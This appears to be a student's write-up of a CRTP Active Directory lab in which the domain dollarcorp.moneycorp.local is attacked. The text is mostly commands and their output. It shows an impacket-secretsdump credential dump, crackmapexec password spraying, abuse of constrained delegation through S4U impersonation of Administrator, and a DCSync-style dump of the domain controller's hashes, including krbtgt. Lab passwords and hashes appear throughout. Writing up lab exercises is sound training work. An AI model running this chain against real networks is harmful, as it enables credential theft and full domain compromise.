#### Theory can be found in [[2. Domain Privilege Escalation#4. KCD]] ####

## Lateral Movement to DCORP-ADMINSVC ##
### Credentials Dumping ###
- student303 is a local administrator to DCORP-ADMINSRV
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# impacket-secretsdump dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A@172.16.4.101
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x0aa524e1204e0a68be320cc136ed76b9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2c0bba089d2d62e4d8911fc2fcc0c2e2:::

<snip>
[*] _SC_SNMPTRAP 
dcorp\websvc:AServicewhichIsNotM3@nttoBe
[*] _SC_wmiApSrv 
dcorp\appadmin:*ActuallyTheWebServer1
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

### Credentials Spraying ###
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb dollarcorp.moneycorp.local_live_hosts.lst -u websvc -p 'AServicewhichIsNotM3@nttoBe'
SMB         172.16.4.217    445    DCORP-APPSRV     [*] Windows 10.0 Build 20348 x64 (name:DCORP-APPSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.81     445    DCORP-SQL1       [*] Windows 10.0 Build 20348 x64 (name:DCORP-SQL1) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.44     445    DCORP-MGMT       [*] Windows 10.0 Build 20348 x64 (name:DCORP-MGMT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.3.11     445    DCORP-CI         [*] Windows 10.0 Build 20348 x64 (name:DCORP-CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [*] Windows 10.0 Build 20348 x64 (name:DCORP-ADMINSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.217    445    DCORP-APPSRV     [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.217    445    DCORP-APPSRV     Node WEBSVC@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.3.81     445    DCORP-SQL1       [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.44     445    DCORP-MGMT       [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.3.11     445    DCORP-CI         [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe 
SMB         172.16.4.101    445    DCORP-ADMINSRV   [+] dollarcorp.moneycorp.local\websvc:AServicewhichIsNotM3@nttoBe
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb dollarcorp.moneycorp.local_live_hosts.lst -u appadmin -p '*ActuallyTheWebServer1'
SMB         172.16.4.44     445    DCORP-MGMT       [*] Windows 10.0 Build 20348 x64 (name:DCORP-MGMT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.81     445    DCORP-SQL1       [*] Windows 10.0 Build 20348 x64 (name:DCORP-SQL1) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.4.217    445    DCORP-APPSRV     [*] Windows 10.0 Build 20348 x64 (name:DCORP-APPSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.11     445    DCORP-CI         [*] Windows 10.0 Build 20348 x64 (name:DCORP-CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [*] Windows 10.0 Build 20348 x64 (name:DCORP-ADMINSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.44     445    DCORP-MGMT       [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.44     445    DCORP-MGMT       Node APPADMIN@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.3.81     445    DCORP-SQL1       [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.217    445    DCORP-APPSRV     [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 (🩸Blooded!🩸)
SMB         172.16.3.11     445    DCORP-CI         [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 
SMB         172.16.4.101    445    DCORP-ADMINSRV   [+] dollarcorp.moneycorp.local\appadmin:*ActuallyTheWebServer1 (🩸Blooded!🩸)
```

## DCORP-ADMINSRV Constrained Delegation Abuse ##

- Query the DC for Delegation
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# impacket-findDelegation dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A -dc-ip 172.16.2.1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName      AccountType  DelegationType                      DelegationRightsTo                          
---------------  -----------  ----------------------------------  -------------------------------------------
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL    
DCORP-ADMINSRV$  Computer     Constrained w/ Protocol Transition  TIME/dcorp-DC                               
DCORP-APPSRV$    Computer     Unconstrained                       N/A                                         
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL 
websvc           Person       Constrained w/ Protocol Transition  CIFS/dcorp-mssql
```

- Request a ST on behalf of the Administrator.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# impacket-getST dollarcorp.moneycorp.local/'DCORP-ADMINSRV$' -hashes :b5f451985fd34d58d5120816d31b5565 -spn 'time/dcorp-dc.dollarcorp.moneycorp.local' -impersonate 'Administrator' -dc-ip 172.16.2.1 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

- Loot the DC
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# export KRB5CCNAME=Administrator.ccache
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# impacket-secretsdump 'dollarcorp.moneycorp.local/Administrator'@DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL -k -no-pass   
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xbab78acd91795c983aef0534e0db38c7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a102ad5753f4c441e3af31c97fad86fd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
dcorp\DCORP-DC$:plain_password_hex:eccb52b95bd8bf61f08386c94d27a3928413787ff0fa72bb7120e4a6a6aecaa4cef78e7ffb7cd6d2db3d4e84e39e4631da51d1aad2d46bfa12159be7b13008f352ae30594ebfc72ef2e37e9789b936db9a8dd1f37506ca1bc850695c6046802a8ca195e7127c18483eaf8382713bb75dbca76a1cb70cd52032a5569828d37b6ec0e8558038e788051e56f1eb4ab30ffbcee41bf5052343e96350e80f803def1876b9f9fb0452cc51a3e96c855ca17bfb9a7e756d3d615613859b242b8aba3c1df1b6646374a09632204c64d4376af8dc069239f455d463b890372edd55fe767e3d1915e36c119e4c23fd0aff3763087d
dcorp\DCORP-DC$:aad3b435b51404eeaad3b435b51404ee:9e629980175422a4356d024f6d348a49:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x558f948af84f9dec3acf3499b5e9af0de2d8e803
dpapi_userkey:0xb1b020a793cbecd7d3ad7aacbc6b73f33c9e4d43
[*] NL$KM 
 0000   21 55 A8 F7 64 DD 9A FA  80 95 0F 03 E8 E4 76 5E   !U..d.........v^
 0010   11 34 99 56 DE 62 E1 00  C6 FD 7D B8 14 AF 4F 73   .4.V.b....}...Os
 0020   58 C1 68 E3 16 E2 04 98  93 A5 39 C6 1B 7A E4 19   X.h.......9..z..
 0030   FE E6 EF DC 73 64 72 8C  F9 2A F2 5C 68 D2 DB 73   ....sdr..*.\h..s
NL$KM:2155a8f764dd9afa80950f03e8e4765e11349956de62e100c6fd7db814af4f7358c168e316e2049893a539c61b7ae419fee6efdc7364728cf92af25c68d2db73
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e9815869d2090ccfca61c1fe0d23986:::
sqladmin\sqladmin:1113:aad3b435b51404eeaad3b435b51404ee:07e8be316e3da9a042a9cb681df19bf5:::
websvc\websvc:1114:aad3b435b51404eeaad3b435b51404ee:cc098f204c5887eaa8253e7c2749156f:::
srvadmin\srvadmin:1115:aad3b435b51404eeaad3b435b51404ee:a98e18228819e8eec3dfa33cb68b0728:::
appadmin\appadmin:1117:aad3b435b51404eeaad3b435b51404ee:d549831a955fee51a43c83efb3928fa7:::
svcadmin\svcadmin:1118:aad3b435b51404eeaad3b435b51404ee:b38ff50264b74508085d82c69794a4d8:::
testda\testda:1119:aad3b435b51404eeaad3b435b51404ee:a16452f790729fa34e8f3a08f234a82c:::
mgmtadmin\mgmtadmin:1120:aad3b435b51404eeaad3b435b51404ee:95e2cd7ff77379e34c6e46265e75d754:::
ciadmin\ciadmin:1121:aad3b435b51404eeaad3b435b51404ee:e08253add90dccf1a208523d02998c3d:::
sql1admin\sql1admin:1122:aad3b435b51404eeaad3b435b51404ee:e999ae4bd06932620a1e78d2112138c6:::

<snip>
```